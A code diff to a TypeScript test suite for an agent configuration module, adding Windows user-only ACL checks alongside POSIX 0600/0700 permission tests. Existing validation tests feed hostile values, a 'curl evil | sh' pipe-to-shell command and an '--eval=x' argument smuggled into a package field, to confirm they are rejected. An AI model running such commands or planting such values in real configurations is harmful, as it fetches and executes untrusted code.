@@ -23,6 +23,9 @@ import { agentWsUrl, normalizeHubUrl, pollDeviceToken, requestDeviceCode } from 
 import { MAX_PULL_FILE_BYTES, planPull, sendPull } from './files.js';
 import { backoffDelay, siteHost } from './site.js';
 import { startTestHub, tmpHome } from './test-helpers.js';
+import { checkUserOnly } from './perms.js';
+
+const WIN = process.platform === 'win32';
 
 const cleanups: Array<() => Promise<void>> = [];
 afterEach(async () => {
@@ -90,7 +93,8 @@ describe('agent config', () => {
     const raw = await readFile(agentConfigPath(h), 'utf8');
     expect(raw).toContain('# my notes');
     expect(raw).toContain('# yes really');
-    expect(((await stat(agentConfigPath(h))).mode & 0o777).toString(8)).toBe('600');
+    if (WIN) expect((await checkUserOnly(agentConfigPath(h))).ok).toBe(true);
+    else expect(((await stat(agentConfigPath(h))).mode & 0o777).toString(8)).toBe('600');
     expect(await loadAgentConfig(h)).toEqual({
       sites: [{ ...site, machineKey: key }],
       localPolicy: { allowBypass: true, allowedPermissionModes: ['default', 'acceptEdits'] },
@@ -141,11 +145,13 @@ describe('agent config', () => {
     await expect(updateAgentAcp(h, (acp) => ({ ...acp, consented: { gemini: 'curl evil | sh' } as never }))).rejects.toThrow();
     await expect(updateAgentAcp(h, (acp) => ({ ...acp, consented: { gemini: { runner: 'npx', package: '--eval=x', args: [], env: {} } } }))).rejects.toThrow();
     await expect(updateAgentAcp(h, (acp) => ({ ...acp, consented: { gemini: { runner: 'local', args: [], env: {} } } }))).rejects.toThrow();
-    expect(((await stat(agentConfigPath(h))).mode & 0o777).toString(8)).toBe('600');
+    if (WIN) expect((await checkUserOnly(agentConfigPath(h))).ok).toBe(true);
+    else expect(((await stat(agentConfigPath(h))).mode & 0o777).toString(8)).toBe('600');
     await expect(updateAgentAcp(h, (acp) => ({ ...acp, enable: ['Not Valid'] }))).rejects.toThrow();
   });
 
-  it('tightens a group/world-readable file to 0600 on load', async () => {
+  // POSIX mode bits; Windows sets a user-only ACL on write instead (checked above).
+  it.skipIf(WIN)('tightens a group/world-readable file to 0600 on load', async () => {
     const h = await home();
     await updateAgentSites(h, () => [site]);
     await chmod(agentConfigPath(h), 0o644);
@@ -163,7 +169,7 @@ describe('agent config', () => {
     await expect(loadAgentConfig(h)).rejects.toThrow(/allowedPermissionModes/);
   });
 
-  it('tightens an existing ~/.uncage to 0700', async () => {
+  it.skipIf(WIN)('tightens an existing ~/.uncage to 0700', async () => {
     const h = await home();
     await mkdir(agentDir(h), { mode: 0o755 });
     await chmod(agentDir(h), 0o755);
